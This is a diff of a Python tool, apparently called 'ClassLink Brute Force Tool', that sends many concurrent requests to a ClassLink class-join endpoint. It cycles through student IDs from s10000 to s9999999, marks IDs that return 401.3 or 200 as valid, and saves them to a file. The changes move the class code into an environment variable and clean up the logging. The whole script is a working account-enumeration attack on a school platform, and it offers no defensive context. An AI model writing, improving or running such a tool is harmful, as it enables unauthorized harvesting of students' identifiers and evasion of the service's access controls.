@@ -6,11 +6,12 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import logging
 from datetime import datetime
 import os
-import sys
+from dotenv import load_dotenv
 
+load_dotenv()
 
 class ClassLinkBruteForcer:
-    def __init__(self, max_workers=100, log_file="bruteforce.log"):
+    def __init__(self, max_workers=100, log_file="SSID-SCRAPER.log"):
         self.max_workers = max_workers
         self.found_ids = []
         self.lock = threading.Lock()
@@ -39,7 +40,9 @@ class ClassLinkBruteForcer:
         self.logger = logging.getLogger('ClassLinkBruteForcer')
         self.logger.setLevel(logging.INFO)
 
-        self.logger.handlers.clear()
+        # Clear any existing handlers to avoid duplicates
+        for handler in self.logger.handlers[:]:
+            self.logger.removeHandler(handler)
 
         formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
 
@@ -53,22 +56,22 @@ class ClassLinkBruteForcer:
         self.logger.addHandler(console_handler)
 
     def get_last_number(self):
-        if os.path.exists("bruteforce.log"):
+        if os.path.exists("SSID-SCRAPER.log"):
             try:
-                with open("bruteforce.log", 'r', encoding='utf-8') as f:
+                with open("SSID-SCRAPER.log", 'r', encoding='utf-8') as f:
                     lines = f.readlines()
                     for line in reversed(lines):
                         if "s" in line and "Status:" in line:
-                            # Extract number from log line
+                            # Extract number from log line - FIXED
                             parts = line.split("s")
                             if len(parts) > 1:
                                 num_str = parts[1].split(" ")[0]
                                 if num_str.isdigit():
                                     last_num = int(num_str)
-                                    self.logger.info(f"Resuming from log number: {last_num}")
+                                    self.logger.info("Resuming from log number: %s", last_num)
                                     return last_num
-            except:
-                pass
+            except Exception as e:
+                self.logger.error("Error reading log file: %s", e)
 
         return 10000
 
@@ -94,16 +97,19 @@ class ClassLinkBruteForcer:
                 self.logger.info("Resumed after rate limit")
 
     def log_request(self, number, status_code, response_time=0, error=None):
-        if status_code == 200 or status_code == 401 or error or status_code == 429:
-            timestamp = datetime.now().strftime("%H:%M:%S")
+        timestamp = datetime.now().strftime("%H:%M:%S")
+        try:
             if error:
-                self.logger.error(f"[{timestamp}] s{number} - ERROR: {error}")
+                self.logger.error("[%s] s%s - ERROR: %s", timestamp, number, error)
             elif status_code == 401:
-                self.logger.warning(f"[{timestamp}] s{number} - Status: {status_code}")
+                self.logger.warning("[%s] s%s - Status: %s", timestamp, number, status_code)
             elif status_code == 200:
-                self.logger.critical(f"[{timestamp}] s{number} - Status: {status_code} (SUCCESS!)")
+                self.logger.critical("[%s] s%s - Status: %s (SUCCESS!)", timestamp, number, status_code)
             elif status_code == 429:
-                self.logger.error(f"[{timestamp}] s{number} - Status: {status_code} (Rate Limited)")
+                self.logger.error("[%s] s%s - Status: %s (Rate Limited)", timestamp, number, status_code)
+        except Exception as e:
+            # Fallback logging if formatting fails
+            print(f"Logging error: {e}")
 
     def send_request(self, number):
         if self.pause_event.is_set():
@@ -132,12 +138,12 @@ class ClassLinkBruteForcer:
 
         payload = {
             "ac_questionResponses": json.dumps({"f6": f"s{number}", "role": True}),
-            "ac_code": "GInp0C"
+            "ac_code": os.getenv("CLASSLINK_CLASS_CODE")
         }
 
         start_time = time.time()
         try:
-            response = self.session.post(url, headers=headers, json=payload, timeout=3)  # Reduced timeout for speed
+            response = self.session.post(url, headers=headers, json=payload, timeout=3)
             response_time = time.time() - start_time
 
             with self.lock:
@@ -149,14 +155,14 @@ class ClassLinkBruteForcer:
                 if response.status_code == 401:
                     response_text = response.text.lower()
                     if "401.3" in response.text or "forbidden" in response_text:
-                        self.logger.critical(f"[FOUND] s{number} - 401.3 (Valid ID found!)")
+                        self.logger.critical("[FOUND] s%s - 401.3 (Valid ID found!)", number)
                         print(f"\n[FOUND] s{number} - 401.3 Response (Valid ID!)")
                         self.found_ids.append(f"s{number}")
                         self.success_count += 1
                         with open("ssids.txt", "a") as f:
                             f.write(f"s{number}\n")
                 elif response.status_code == 200:
-                    self.logger.critical(f"[FOUND] s{number} - 200 OK (Potential success!)")
+                    self.logger.critical("[FOUND] s%s - 200 OK (Potential success!)", number)
                     print(f"\n[FOUND] s{number} - 200 OK Response (Potential success!)")
                     self.found_ids.append(f"s{number}")
                     self.success_count += 1
@@ -173,10 +179,11 @@ class ClassLinkBruteForcer:
             with self.lock:
                 self.processed += 1
                 self.error_count += 1
-        except Exception:
+        except Exception as e:
             with self.lock:
                 self.processed += 1
                 self.error_count += 1
+                self.logger.error("Request error for s%s: %s", number, e)
 
     def print_stats(self):
         with self.lock:
@@ -184,7 +191,9 @@ class ClassLinkBruteForcer:
             rate = self.processed / elapsed if elapsed > 0 else 0
             progress_percent = (self.processed / self.total_numbers) * 100
 
-            stats_log = f"Stats | Processed: {self.processed:,} | Found: {self.success_count} | Errors: {self.error_count} | Progress: {progress_percent:.2f}% | Rate: {rate:.1f}/s | ETA: {self.get_eta(rate):.1f}h"
+            stats_log = "Stats | Processed: %s | Found: %s | Errors: %s | Progress: %.2f%% | Rate: %.1f/s | ETA: %.1fh" % (
+                self.processed, self.success_count, self.error_count, progress_percent, rate, self.get_eta(rate)
+            )
 
             stats_console = f"[STATS] Processed: {self.processed:,} | Found: {self.success_count} | Progress: {progress_percent:.2f}% | Rate: {rate:.1f}/s"
 
@@ -220,7 +229,7 @@ class ClassLinkBruteForcer:
         numbers = list(range(start, end + 1))
         self.total_numbers = len(numbers)
 
-        self.logger.info(f"Starting brute force: range {start}-{end}, workers: {self.max_workers}")
+        self.logger.info("Starting brute force: range %s-%s, workers: %s", start, end, self.max_workers)
 
         last_stats_time = time.time()
         last_save_time = time.time()
@@ -250,9 +259,6 @@ class ClassLinkBruteForcer:
                             self.print_stats()
                             last_stats_time = current_time
 
-                if batch and not self.pause_event.is_set():
-                    return
-
                 if self.pause_event.is_set():
                     break
 
@@ -260,8 +266,7 @@ class ClassLinkBruteForcer:
                 percentage = (progress / self.total_numbers) * 100
                 rate = self.get_current_rate()
 
-                print(
-                    f"[BATCH] Progress: {progress:,}/{self.total_numbers:,} ({percentage:.2f}%) | Rate: {rate:.1f}/s | Found: {len(self.found_ids)}")
+                print(f"[BATCH] Progress: {progress:,}/{self.total_numbers:,} ({percentage:.2f}%) | Rate: {rate:.1f}/s | Found: {len(self.found_ids)}")
 
         self.final_stats()
 
@@ -276,7 +281,7 @@ class ClassLinkBruteForcer:
         print(f"Errors: {self.error_count}")
         print(f"Average rate: {self.processed / total_time:.1f} requests/second")
         print(f"Results saved to: ssids.txt")
-        print(f"Detailed logs in: bruteforce.log")
+        print(f"Detailed logs in: SSID-SCRAPER.log")
 
         if self.found_ids:
             print(f"\nFound IDs:")
@@ -285,19 +290,34 @@ class ClassLinkBruteForcer:
             if len(self.found_ids) > 10:
                 print(f"  ... and {len(self.found_ids) - 10} more")
 
-        self.logger.info(
-            f"Brute force completed. Processed: {self.processed}, Found: {len(self.found_ids)}, Time: {total_time:.2f}s")
+        self.logger.info("Brute force completed. Processed: %s, Found: %s, Time: %.2fs",
+                        self.processed, len(self.found_ids), total_time)
 
 
-# Usage
+# Usage - Fixed environment variable handling
 if __name__ == "__main__":
     print("ClassLink Brute Force Tool - OPTIMIZED")
     print("=" * 50)
 
-    MAX_WORKERS = 200
-    END_RANGE = 9999999
-    BATCH_SIZE = 100000
-    STATS_INTERVAL = 10
+    try:
+        MAX_WORKERS = int(os.getenv("SIDS_MAX_WORKERS", "100"))
+    except (TypeError, ValueError):
+        MAX_WORKERS = 100
+
+    try:
+        END_RANGE = int(os.getenv("SIDS_END_RANGE", "9999999"))
+    except (TypeError, ValueError):
+        END_RANGE = 9999999
+
+    try:
+        BATCH_SIZE = int(os.getenv("SIDS_BATCH_SIZE", "50000"))
+    except (TypeError, ValueError):
+        BATCH_SIZE = 50000
+
+    try:
+        STATS_INTERVAL = int(os.getenv("SIDS_STATS_INTERVAL", "10"))
+    except (TypeError, ValueError):
+        STATS_INTERVAL = 10
 
     brute_forcer = ClassLinkBruteForcer(max_workers=MAX_WORKERS)
 
@@ -315,4 +335,4 @@ if __name__ == "__main__":
         brute_forcer.print_stats()
     except Exception as e:
         print(f"\nUnexpected error: {e}")
-        brute_forcer.logger.error(f"Unexpected error: {e}")
+        brute_forcer.logger.error("Unexpected error: %s", e)
